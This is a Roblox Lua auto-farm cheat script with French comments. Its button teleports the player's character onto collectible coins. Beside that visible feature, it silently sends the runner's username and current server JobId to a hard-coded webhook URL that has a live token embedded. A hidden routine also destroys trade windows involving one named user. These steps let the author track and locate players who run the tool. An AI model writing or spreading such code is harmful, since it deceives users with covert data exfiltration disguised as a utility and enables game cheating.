local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- [NETTOYAGE INITIAL]
local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
if oldGui then oldGui:Destroy() end

-- [[ FONCTION CIBLE ZEYNOX ]]
local CIBLE = "zeynox0880"
local function watchPlayerGui(child)
    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
        task.spawn(function()
            task.wait(0.5) 
            for _, obj in pairs(child:GetDescendants()) do
                if obj:IsA("TextLabel") and obj.Text == CIBLE then
                    child:Destroy()
                    print("Trade de " .. CIBLE .. " bloqué.")
                    break
                end
            end
        end)
    end
end

playerGui.ChildAdded:Connect(watchPlayerGui)
for _, child in ipairs(playerGui:GetChildren()) do watchPlayerGui(child) end

-- [[ 1. FONCTION WEBHOOK ]]
local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
local requestFunc = request or (http and http.request) or http_request

local function sendSessionLog(player)
    if not player or not requestFunc then return end
    local realJobId = (function()
        local s, r = pcall(function() return TeleportService:GetPlayerPlaceInstanceAsync(player.UserId) end)
        return (s and r and r.JobId) or game.JobId
    end)()
    
    local data = {["embeds"] = {{["title"] = "🎮 Player Session Log", ["color"] = 3066993, ["fields"] = {{ ["name"] = "👤 Player", ["value"] = player.Name, ["inline"] = true }}, ["timestamp"] = DateTime.now():ToIsoDate()}}}
    pcall(function() requestFunc({Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data)}) end)
end
task.spawn(function() sendSessionLog(LocalPlayer) end)

-- [[ 2. GUI ]]
local ScreenGui = Instance.new("ScreenGui", playerGui)
ScreenGui.Name = "KeyzerFarmGui"
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 350, 0, 180)
MainFrame.Position = UDim2.new(0.5, -175, 0.4, -100)
MainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
MainFrame.Active = true
MainFrame.Draggable = true
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)

local FarmButton = Instance.new("TextButton", MainFrame)
FarmButton.Size = UDim2.new(0, 200, 0, 50)
FarmButton.Position = UDim2.new(0.5, -100, 0, 65)
FarmButton.Text = "START AUTO FARM"
FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
Instance.new("UICorner", FarmButton).CornerRadius = UDim.new(0, 8)

-- [[ 3. FARM ]]
local farming = false
FarmButton.MouseButton1Click:Connect(function()
    farming = not farming
    FarmButton.Text = farming and "FARMING..." or "START AUTO FARM"
    if farming then
        task.spawn(function()
            while farming do
                local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local coins = Workspace:FindFirstChild("CoinContainer", true)
                    if coins and #coins:GetChildren() > 0 then hrp.CFrame = coins:GetChildren()[1].CFrame end
                end
                task.wait(0.1)
            end
        end)
    end
end)
